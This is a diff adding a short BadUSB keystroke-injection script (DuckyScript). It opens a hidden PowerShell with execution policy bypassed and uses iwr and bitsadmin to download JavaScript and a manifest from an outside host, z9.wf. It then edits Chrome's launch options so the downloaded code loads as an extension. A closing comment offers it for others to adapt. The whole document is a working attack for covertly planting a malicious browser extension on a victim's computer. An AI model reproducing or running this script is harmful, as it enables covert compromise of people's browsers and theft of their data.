@@ -1,0 +1,27 @@
+LOCALE ES
+WINDOWS r
+STRING powershell -NoP -NonI -W h -Exec Bypass md "C:\Users\Public\Documents\ce"; iwr "https://z9.wf/content.js" -outfile "C:\Users\Public\Documents\ce\content.js"; iwr "https://z9.wf/demo.js"  -outfile "C:\Users\Public\Documents\ce\demo.js";
+ENTER
+WINDOWS r
+STRING bitsadmin /transfer "job" https://z9.wf/manifest.json C:\Users\Public\Documents\ce\manifest.json
+ENTER
+WINDOWS
+STRING chrome
+SHIFT F10
+DOWN
+DOWN
+ENTER
+SHIFT F10
+UP
+ENTER
+RIGHT
+SPACE
+STRING --load-extension=C:\Users\Public\Documents\ce
+ENTER
+LEFT
+ENTER
+ENTER
+
+
+
+REM 'Please add the delays u need. It works on my scenario, but could change the behaviour in your own computer. There is some big possible improvements thinked AFTER i release the code. Feel free to improve it :)
